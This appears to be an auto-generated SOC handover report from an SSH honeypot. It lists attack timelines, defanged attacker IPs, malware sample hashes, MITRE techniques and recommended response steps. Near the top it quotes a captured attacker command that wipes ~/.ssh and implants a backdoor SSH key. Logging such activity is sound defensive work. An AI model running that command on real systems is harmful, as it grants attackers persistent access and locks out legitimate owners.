| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 10:32:15` | `cowrie.session.connect` |
| `2026-04-14 10:32:15` | `cowrie.client.version` |
| `2026-04-14 10:32:15` | `cowrie.client.kex` |
| `2026-04-14 10:32:16` | `cowrie.login.success` |
| `2026-04-14 10:32:17` | `cowrie.session.params` |
| `2026-04-14 10:32:17` | `cowrie.command.input` |
| `2026-04-14 10:32:17` | `cowrie.command.failed` |
| `2026-04-14 10:32:17` | `cowrie.log.closed` |
| `2026-04-14 10:32:18` | `cowrie.session.params` |
| `2026-04-14 10:32:18` | `cowrie.command.input` |
| `2026-04-14 10:32:18` | `cowrie.session.file_download` |
| `2026-04-14 10:32:18` | `cowrie.log.closed` |
| `2026-04-14 10:32:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.30.115[.]187` to AbuseIPDB if not already reported
- [ ] Block `186.30.115[.]187` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9cb0d4217391

| Field | Detail |
|---|---|
| **Source IP** | `186.30.115[.]187` |
| **First Seen** | 2026-04-14 10:32 |
| **Last Seen** | 2026-04-14 10:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 10:32:23` | `cowrie.session.connect` |
| `2026-04-14 10:32:23` | `cowrie.client.version` |
| `2026-04-14 10:32:23` | `cowrie.client.kex` |
| `2026-04-14 10:32:24` | `cowrie.login.success` |
| `2026-04-14 10:32:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.30.115[.]187` to AbuseIPDB if not already reported
- [ ] Block `186.30.115[.]187` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `154.198.215[.]50` | **26** | 2026-04-14 09:45 | 2026-04-14 10:26 | 0m | 26 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `103.147.211[.]2` | **25** | 2026-04-14 09:41 | 2026-04-14 10:28 | 0m | 25 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `186.30.115[.]187` | **23** | 2026-04-14 09:42 | 2026-04-14 10:32 | 0m | 23 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `3.134.216[.]108` | **7** | 2026-04-14 10:12 | 2026-04-14 10:20 | 0m | 6 | `T1110.001` | 🟢 LOW |
| `103.191.14[.]243` | 1 | 2026-04-14 09:42 | 2026-04-14 09:42 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `115.190.51[.]71` | 1 | 2026-04-14 09:43 | 2026-04-14 09:45 | 120s | 0 | `T1592` | 🟢 LOW |
| `139.19.117[.]130` | 1 | 2026-04-14 09:58 | 2026-04-14 09:58 | 10s | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `185.233.3[.]95` | 1 | 2026-04-14 09:41 | 2026-04-14 09:41 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `193.25.113[.]17` | 1 | 2026-04-14 10:07 | 2026-04-14 10:08 | 30s | 0 | `T1592` | 🟢 LOW |
| `218.0.56[.]78` | 1 | 2026-04-14 09:44 | 2026-04-14 09:46 | 120s | 0 | `T1592` | 🟢 LOW |
| `47.145.202[.]208` | 1 | 2026-04-14 10:43 | 2026-04-14 10:43 | 12s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (22 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 43/100 | 🟡 MEDIUM | **35/76** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 41/100 | 🟡 MEDIUM | **29/76** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 43/100 | 🟡 MEDIUM | **35/76** 🔴 |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **48/76** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 43/100 | 🟡 MEDIUM | **33/76** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **30/76** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 41/100 | 🟡 MEDIUM | **28/76** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **48/76** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **48/76** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **48/76** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **48/76** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `47.145.202[.]208` | US | Frontier Communications of America, Inc. | **100** ⚠️ | 0 |
| `193.25.113[.]17` | RO | MY SERVER MEDIA SRL | **100** ⚠️ | 1 |
| `3.134.216[.]108` | US | Amazon Technologies Inc. | **100** ⚠️ | 50 |
| `154.198.215[.]50` | HK | CenturyNetworks LTD | **100** ⚠️ | 15 |
| `103.147.211[.]2` | ID | PT Global Visi Vindici | **100** ⚠️ | 50 |
| `186.30.115[.]187` | CO | S3 SIMPLE SMART SPEEDY S.A.S. | **100** ⚠️ | 50 |
| `103.191.14[.]243` | ID | PT NAWASENA WASA ANUGERAH | **100** ⚠️ | 50 |
| `185.233.3[.]95` | KZ | Mws Cloud, Limited Liability Company | **100** ⚠️ | 50 |
| `218.0.56[.]78` | CN | CHINANET Zhejiang province network | **100** ⚠️ | 50 |
| `115.190.51[.]71` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 141 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 79 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 61 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 31 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 31 |

---

## 🔕 False Positive Summary (3 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 1 |
| AbuseIPDB score 1 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 1 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 152 cases |
| Tool 34  | Credential Extractor        | ✅ 145 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 3 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 14 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 3 filtered (2.0%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 14 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 22 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 61 priority case(s) shown individually · 11 recon entry/entries in table (4 group(s) consolidating 81 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-04-14T11:08:13Z_
